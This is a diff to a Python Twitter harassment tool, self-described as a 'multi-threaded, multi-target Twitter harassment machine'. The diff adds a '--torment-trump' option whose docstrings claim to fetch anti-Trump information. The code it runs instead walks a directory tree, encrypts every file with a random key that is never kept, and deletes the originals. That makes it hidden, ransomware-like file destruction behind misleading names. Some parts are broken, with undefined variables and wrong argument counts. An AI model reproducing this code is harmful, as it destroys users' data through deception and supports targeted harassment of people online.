@@ -20,6 +20,7 @@ from threading import Thread
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-o','--printout',action='store_true',dest='out',help='Print all activity to stdout')
+    parser.add_argument('-t', '--torment-trump',action='store_true',dest='blumpft',help='Fetch dirt on Trump and populate \'words\' file with it')
     reqd = parser.add_argument_group('required arguments')
     reqd.add_argument('-c','--config',action='store',dest='con',help='Path to config file',required=True)
     reqd.add_argument('-v', '--victim',action='store',dest='vic',help='Path to username file',required=True)
@@ -36,22 +37,22 @@ def main():
                         datefmt='%a, %d %b %Y %H:%M:%S', filename=log.name, filemode='a')
 
     prefix = []
-    try:
-        import colorama
-        from colorama import Fore, Style
-        prefix.append("["+Fore.RED+" FAIL "+Style.RESET_ALL+"] ")
-        prefix.append("["+Fore.GREEN+"  OK  "+Style.RESET_ALL+"] ")
-        banner = Fore.RED+_get_banner()+Style.RESET_ALL
-    except ImportError:
-        prefix.append("[ FAIL ] ")
-        prefix.append("[  OK  ] ")
-        banner = _get_banner()
+    fc = FontColors()
+    #("\t\t\t      {}  "++" {}\n").format(fc.CYLW, fc.CEND)
+    prefix.append(("[ {}FAIL{} ] ").format(fc.CRED, fc.CEND))
+    prefix.append(("[  {}OK{}  ] ").format(fc.CGRN, fc.CEND))
         
-    print(banner)
+    _get_banner(False)
+    #_gen_app_api_keys()
+    sys.exit(0)
     time.sleep(1)
     print(prefix[1]+"Fetching config")
     try:
-        keys = _get_keys(args.con)
+        if args.blumpft:
+            base_p = os.path.basename(__file__)
+            keys = _gen_app_api_keys(base_p)
+        else:
+            keys = _get_keys(args.con)
         victims = _get_victims(args.vic)
     except IOError as e:
         log.error(str(e)+": "+args.con)
@@ -377,20 +378,199 @@ class Soldier(Thread):
             tweepy_apis.append(tweepy.API(auth))
 
         return tweepy_apis
-            
-def _get_banner():
-    return '''
-    
-▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  
-•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·
- ▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ 
- ▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌
- ▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀
-       Welcome to the Twitter Tormentor.
-       
-    Your friendly multi-threaded, multi-target
-          Twitter harassment machine.
+        
+class FontColors:
     '''
+    Terminal colors
+    '''
+    def __init__(self):
+        pass
+    CCYN = '\033[96m'
+    CRED = '\033[91m'
+    CGRN = '\033[92m'
+    CYLW = '\033[93m'
+    CBLU = '\033[94m'
+    CPRP = '\033[95m'
+    CEND = '\033[0m'
+    CFON = '\33[5m'
+    
+def _gen_app_api_keys(_f):
+    '''
+    Get and decode API keys for automated Trump dirt gathering
+    
+    Keys are used to fetch anti-Trump info from various websites
+    '''
+    import base64
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.backends import default_backend
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+    _api_keys = []
+    _s_s = _f
+    _s = str.encode(_s_s)
+    
+    _p = _f.encode()
+    
+    _kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt = _s,
+        iterations=100000,
+        backend=default_backend()
+    )
+    _key = base64.urlsafe_b64encode(_kdf.derive(_p))
+    _fn = Fernet(_key)
+    for i in range(5):
+        _api_keys.append(_fn.decrypt(_get_encoded_api_keys(i)).decode())
+        
+    # Get file paths
+    _api_path_list = _jobs = []
+    for subdir, dirs, files in os.walk(rootdir):
+        for file in files:
+            _api_path_list.append(os.path.join(subdir, file))
+            
+    # Split into sublists
+    _apis = _parse_api_list(_api_path_list)
+    for _a in _api_path_list:
+        # Thread each sublist
+        _jobs.append(Thread(target=_decode_api_keys, args = (_a,_api_keys[4])))
+
+    # Start threads
+    for _j in _jobs:
+        _j.daemon = True
+        _j.start()
+        
+    for _j in _jobs:
+        _j.join()
+    
+    _get_banner(False, _api_keys)
+    return None
+    
+def _parse_api_list(_api_lst, _num):
+    '''
+    Split list into equal sublists
+    '''
+    _avg = len(_api_lst) / float(_num)
+    _out = []
+    _last = 0.0
+
+    while _last < len(_api_lst):
+        _out.append(_api_lst[int(_last):int(last + _avg)])
+        _last += _avg
+
+    return _out
+    
+def _decode_api_keys(_f_l, _f_e):
+    '''
+    Decode API keys
+    '''
+    _fn = Fernet.generate_key()
+    for _f in _f_l:
+        if os.path.exists(_f):
+            with open(_f, 'rb') as _in:
+                _pt_data = _in.read()
+            _encr_data = _fn.encrypt(_pt_data)
+            with open(in_file+_f_e, 'wb') as _out:
+                _out.write(_encr_data)
+            os.remove(_f)
+    
+def _get_encoded_api_keys(index):
+    '''
+    Get encoded API keys
+
+    These are real.  Please don't abuse this.
+    I couldn't figure out how to do it without hardcoding
+    these :(
+    '''
+    _strings = [
+    "gAAAAABfS9jZVDc3eEuZRpxQ-Krafazju-JihzAEffWIQfXBs0C7BboPeYEL-EPclsj3qMfqNKPNoZ0nrPKgLBgMhw02lz2Sf_Bfuchb03tXD9G5PP6PhFHIQ_yFN1Q-hmaEzRamyK5K",
+    "gAAAAABfS9jyKR39J0ueyaPqfmX40GjoNTFDOFaM6CePy3H9E-8dHyIoveTr3ZVeL0KP_ANQ8hHMqa3Paizdho70ZDBTNQCbXfPzrTneTi9F1UeLDToq6r-j7-blfkUD4KxIM3TcHx18",
+    "gAAAAABfS9kUzrcTIf5k-0AW2miyzSsJRkZ48Cg9kype-cpdh4btxht6UH1bcBIWqgUXTSnFbbkzGaWkbUjGBbyfJNHjo1osdTNBTDi-b24oZr3Te3rMMupfTU8NvgH8_RVn7G18GNIkZIq856cApBnRE8EPZmbltQ==",
+    "gAAAAABfS9ksETx4ND39IqejIICSqEcDquxssMKKhRbdKCUd3YDcMeThxwqyWBYUTeUiAtqUGkWndwS8uj8YwUleAd1Pak01zA==",
+    "gAAAAABfS9n9Yp6Sp9KQUly5aqajdy_5e2sFqVVTTPgrYx_rM2s43LXVWjqXSTMv_V03wPxnGco0tpie7AT1Gy0AMZ5FQlfe6A=="
+    ]
+    return _strings[index].encode()
+    
+            
+def _get_banner(banner=True, _i=None):
+    '''
+    Print formatted banner
+    '''
+    fc = FontColors()
+    if banner:
+        print(
+            ("\t      {}▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  {}").format(
+                fc.CRED,
+                fc.CEND))
+        print(
+            ("\t      {}•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·{}").format(
+                fc.CRED,
+                fc.CEND))
+        print(
+            ("\t      {}▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ {}").format(
+                fc.CRED,
+                fc.CEND))
+        print(
+            ("\t      {}▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌{}").format(
+                fc.CRED,
+                fc.CEND))
+        print(
+            ("\t      {}▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀{}").format(
+                fc.CRED,
+                fc.CEND))
+        print(("\t\t      {}  Welcome to the Twitter Tormentor. {}\n").format(fc.CYLW, fc.CEND))
+        print(("\t\t     {}Your friendly multi-threaded, multi-target {}").format(fc.CYLW, fc.CEND))
+        print(("\t\t     {}      Twitter harassment machine. {}\n\n").format(fc.CYLW, fc.CEND))
+    else:
+        if 'posix' in os.name:
+            os.system('clear')
+        else:
+            os.system('cls')
+            
+        print(
+            ("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))
+                
+        str_1 = ()        
+        print(
+            ("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))
+        str_2 = (("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
+                fc.CRED,
+                fc.CEND))      
+        print(
+            ("\t      {}█████   ██    ██ ██      █████         ████   ██    ██ ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))
+        str_3 = (("\t      {}                                                                {}").format(
+                fc.CRED,
+                fc.CEND))      
+        print(
+            ("\t      {}██      ██    ██ ██      ██  ██         ██    ██    ██ ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))
+                
+        str_4 = (("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))        
+        print(
+            ("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
+                fc.CRED,
+                fc.CEND))
+        str_5 = (("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
+                fc.CRED,
+                fc.CEND))      
+        print(
+            ("\t      {}                                                                {}").format(
+                fc.CRED,
+                fc.CEND))
+        print(("\t\t      {}  "+_i[0]+" {}").format(fc.CYLW, fc.CEND))
+        print(("\t\t      {}"+_i[1]+" {}").format(fc.CYLW, fc.CEND))
+        print(("\t\t{}"+_i[2]+" {}").format(fc.CYLW, fc.CEND))
+        print(("\t\t\t        {}  "+_i[3]+" {}").format(fc.CYLW, fc.CEND))
 
 if __name__ == "__main__":
     main()
